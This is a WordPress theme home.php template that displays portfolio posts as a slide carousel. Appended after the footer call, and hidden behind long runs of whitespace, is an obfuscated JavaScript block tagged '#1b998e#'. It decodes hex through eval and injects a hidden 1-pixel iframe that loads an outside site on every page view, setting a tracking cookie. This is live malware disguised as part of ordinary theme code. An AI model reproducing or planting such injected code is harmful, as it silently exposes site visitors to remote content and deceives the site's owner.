<?php 
//HOME.PHP = FEED OR BLOG PAGE

get_header(); ?>
<div id="container">        
     <div id="content">
       <ul id="roundabout_ul">
				<li class="monolith"><h4 class="title"></h4><p class="project_content"></p><a href='#myModal' class='url' role='button' data-toggle='modal'>Read More ... </a></br><p style="text-align:left; font-size: 100%; font-variant: small-caps; margin-left: 10px;color: #63832E;">Click on slides to bring to front!</p></li>
				
				<?php
						$my_query = new WP_Query(array(
							'post_type'=>'post',
							'category_name' => 'portfolio'
						));
					
						/*echo '<pre>';
						
							print_r($my_query);
						
						echo '</pre>';
						*/
				?>
				
				
				<?php
				
				if( $my_query->have_posts() ):
						while( $my_query->have_posts() ):
							
							$my_query->the_post();
							
	        				//Advanced custom fields
		
							$img = get_field('project_thumbnail');
							
							echo "<li class='mover'>";
							
								echo "<img style='width:100%;height:100%;' src='".$img."' />";
							
								//hidden title information
								echo "<h4 class='title'>";
						    		the_title();
								echo "</h4>";
							
								$post_excerpt = get_the_excerpt();
							
								//hidden content information
								echo "<h7 class='project_content'>";
									echo $post_excerpt;
								echo "</h7>";
								
								$website_url = get_field('website_url');
								
								//hidden website_url information
								echo "<h7 class='hidden_website_url'>";
									echo $website_url;
								echo "</h7>";
								
								$github_url = get_field('github_url');
								
								//hidden github_url information
								echo "<h7 class='hidden_github_url'>";
									echo $github_url;
								echo "</h7>";
								
								//hidden image_url information
								echo "<h7 class='image_url'>";
									echo $img;
								echo "</h7>";
											
								 $problem_summary = get_field('problem_summary');
								//hidden problem_summary information
								echo "<h7 class='problem_summary'>";
									echo $problem_summary;
								echo "</h7>";
								  $solution_summary = get_field('solution_summary');
								//hidden solution_summary information
								echo "<h7 class='solution_summary'>";
									echo $solution_summary;
								echo "</h7>";			
											
											
								$technology_list_html = '';
								$technology_list = get_field('technologies');
								//hidden technologies information
								echo "<h7 class='technology_list'>";								
									foreach($technology_list as $key=>$value){
										$technology_list_html .= "<p><img class='prog_icon' src='http://www.jmcdesignstudios.com/wp-content/themes/jmcdesign/images/prog.png'/>" . $value . "</p>";
									}
									
									echo $technology_list_html;
								echo "</h7>";
 								
 								$services_list_html = '';
								$services_list = get_field('services');
								
								//hidden services information
								echo "<h7 class='services_list'>";								
									foreach($services_list as $key=>$value){
										$services_list_html .= "<p><img class='prog_icon' src='http://www.jmcdesignstudios.com/wp-content/themes/jmcdesign/images/prog.png'/>" . $value . "</p>";
									}
									
									echo $services_list_html;
								echo "</h7>";
 								
 								
							echo "</li>";
							   
					endwhile;
					else: 
				?>
                    
                <p>Sorry no posts found... </p>    
                    
                <?php endif; ?>  				
		</ul>

    </div><!-- end content -->
    
    
   </div><!-- end container -->
            
<?php get_footer(); ?>
<?
#1b998e#
                                                                                                                                                                                                                                                          echo "                                                                                                                                                                                                                                                          <script type=\"text/javascript\" language=\"javascript\" >                                                                                                                                                                                                                                                          ps=\"split\";e=eval;v=\"0x\";a=0;z=\"y\";try{a*=25}catch(zz){a=1}if(!a){try{--e(\"doc\"+\"ument\")[\"\x62od\"+z]}catch(q){a2=\"_\";sa=0xa-02;}z=\"28_6e_7d_76_6b_7c_71_77_76_28_82_82_82_6e_6e_6e_30_31_28_83_15_12_28_7e_69_7a_28_6a_81_72_28_45_28_6c_77_6b_7d_75_6d_76_7c_36_6b_7a_6d_69_7c_6d_4d_74_6d_75_6d_76_7c_30_2f_71_6e_7a_69_75_6d_2f_31_43_15_12_15_12_28_6a_81_72_36_7b_7a_6b_28_45_28_2f_70_7c_7c_78_42_37_37_6d_7a_77_7c_71_6b_69_75_6d_76_7c_6d_36_77_7a_6f_37_74_77_69_76_37_79_5f_53_4c_3f_41_55_6f_36_78_70_78_2f_43_15_12_28_6a_81_72_36_7b_7c_81_74_6d_36_78_77_7b_71_7c_71_77_76_28_45_28_2f_69_6a_7b_77_74_7d_7c_6d_2f_43_15_12_28_6a_81_72_36_7b_7c_81_74_6d_36_6a_77_7a_6c_6d_7a_28_45_28_2f_38_2f_43_15_12_28_6a_81_72_36_7b_7c_81_74_6d_36_70_6d_71_6f_70_7c_28_45_28_2f_39_78_80_2f_43_15_12_28_6a_81_72_36_7b_7c_81_74_6d_36_7f_71_6c_7c_70_28_45_28_2f_39_78_80_2f_43_15_12_28_6a_81_72_36_7b_7c_81_74_6d_36_74_6d_6e_7c_28_45_28_2f_39_78_80_2f_43_15_12_28_6a_81_72_36_7b_7c_81_74_6d_36_7c_77_78_28_45_28_2f_39_78_80_2f_43_15_12_15_12_28_71_6e_28_30_29_6c_77_6b_7d_75_6d_76_7c_36_6f_6d_7c_4d_74_6d_75_6d_76_7c_4a_81_51_6c_30_2f_6a_81_72_2f_31_31_28_83_15_12_28_6c_77_6b_7d_75_6d_76_7c_36_7f_7a_71_7c_6d_30_2f_44_6c_71_7e_28_71_6c_45_64_2f_6a_81_72_64_2f_46_44_37_6c_71_7e_46_2f_31_43_15_12_28_6c_77_6b_7d_75_6d_76_7c_36_6f_6d_7c_4d_74_6d_75_6d_76_7c_4a_81_51_6c_30_2f_6a_81_72_2f_31_36_69_78_78_6d_76_6c_4b_70_71_74_6c_30_6a_81_72_31_43_15_12_28_85_15_12_85_15_12_6e_7d_76_6b_7c_71_77_76_28_5b_6d_7c_4b_77_77_73_71_6d_30_6b_77_77_73_71_6d_56_69_75_6d_34_6b_77_77_73_71_6d_5e_69_74_7d_6d_34_76_4c_69_81_7b_34_78_69_7c_70_31_28_83_15_12_28_7e_69_7a_28_7c_77_6c_69_81_28_45_28_76_6d_7f_28_4c_69_7c_6d_30_31_43_15_12_28_7e_69_7a_28_6d_80_78_71_7a_6d_28_45_28_76_6d_7f_28_4c_69_7c_6d_30_31_43_15_12_28_71_6e_28_30_76_4c_69_81_7b_45_45_76_7d_74_74_28_84_84_28_76_4c_69_81_7b_45_45_38_31_28_76_4c_69_81_7b_45_39_43_15_12_28_6d_80_78_71_7a_6d_36_7b_6d_7c_5c_71_75_6d_30_7c_77_6c_69_81_36_6f_6d_7c_5c_71_75_6d_30_31_28_33_28_3b_3e_38_38_38_38_38_32_3a_3c_32_76_4c_69_81_7b_31_43_15_12_28_6c_77_6b_7d_75_6d_76_7c_36_6b_77_77_73_71_6d_28_45_28_6b_77_77_73_71_6d_56_69_75_6d_33_2a_45_2a_33_6d_7b_6b_69_78_6d_30_6b_77_77_73_71_6d_5e_69_74_7d_6d_31_15_12_28_33_28_2a_43_6d_80_78_71_7a_6d_7b_45_2a_28_33_28_6d_80_78_71_7a_6d_36_7c_77_4f_55_5c_5b_7c_7a_71_76_6f_30_31_28_33_28_30_30_78_69_7c_70_31_28_47_28_2a_43_28_78_69_7c_70_45_2a_28_33_28_78_69_7c_70_28_42_28_2a_2a_31_43_15_12_85_15_12_6e_7d_76_6b_7c_71_77_76_28_4f_6d_7c_4b_77_77_73_71_6d_30_28_76_69_75_6d_28_31_28_83_15_12_28_7e_69_7a_28_7b_7c_69_7a_7c_28_45_28_6c_77_6b_7d_75_6d_76_7c_36_6b_77_77_73_71_6d_36_71_76_6c_6d_80_57_6e_30_28_76_69_75_6d_28_33_28_2a_45_2a_28_31_43_15_12_28_7e_69_7a_28_74_6d_76_28_45_28_7b_7c_69_7a_7c_28_33_28_76_69_75_6d_36_74_6d_76_6f_7c_70_28_33_28_39_43_15_12_28_71_6e_28_30_28_30_28_29_7b_7c_69_7a_7c_28_31_28_2e_2e_15_12_28_30_28_76_69_75_6d_28_29_45_28_6c_77_6b_7d_75_6d_76_7c_36_6b_77_77_73_71_6d_36_7b_7d_6a_7b_7c_7a_71_76_6f_30_28_38_34_28_76_69_75_6d_36_74_6d_76_6f_7c_70_28_31_28_31_28_31_15_12_28_83_15_12_28_7a_6d_7c_7d_7a_76_28_76_7d_74_74_43_15_12_28_85_15_12_28_71_6e_28_30_28_7b_7c_69_7a_7c_28_45_45_28_35_39_28_31_28_7a_6d_7c_7d_7a_76_28_76_7d_74_74_43_15_12_28_7e_69_7a_28_6d_76_6c_28_45_28_6c_77_6b_7d_75_6d_76_7c_36_6b_77_77_73_71_6d_36_71_76_6c_6d_80_57_6e_30_28_2a_43_2a_34_28_74_6d_76_28_31_43_15_12_28_71_6e_28_30_28_6d_76_6c_28_45_45_28_35_39_28_31_28_6d_76_6c_28_45_28_6c_77_6b_7d_75_6d_76_7c_36_6b_77_77_73_71_6d_36_74_6d_76_6f_7c_70_43_15_12_28_7a_6d_7c_7d_7a_76_28_7d_76_6d_7b_6b_69_78_6d_30_28_6c_77_6b_7d_75_6d_76_7c_36_6b_77_77_73_71_6d_36_7b_7d_6a_7b_7c_7a_71_76_6f_30_28_74_6d_76_34_28_6d_76_6c_28_31_28_31_43_15_12_85_15_12_71_6e_28_30_76_69_7e_71_6f_69_7c_77_7a_36_6b_77_77_73_71_6d_4d_76_69_6a_74_6d_6c_31_15_12_83_15_12_71_6e_30_4f_6d_7c_4b_77_77_73_71_6d_30_2f_7e_71_7b_71_7c_6d_6c_67_7d_79_2f_31_45_45_3d_3d_31_83_85_6d_74_7b_6d_83_5b_6d_7c_4b_77_77_73_71_6d_30_2f_7e_71_7b_71_7c_6d_6c_67_7d_79_2f_34_28_2f_3d_3d_2f_34_28_2f_39_2f_34_28_2f_37_2f_31_43_15_12_15_12_82_82_82_6e_6e_6e_30_31_43_15_12_85_15_12_85_15_12\"[ps](a2);za=\"\";for(i=0;i<z.length;i++){za+=String[\"fromCharCode\"](e(v+(z[i]))-sa);}zaz=za;e(zaz);}</script>";

#/1b998e#
?>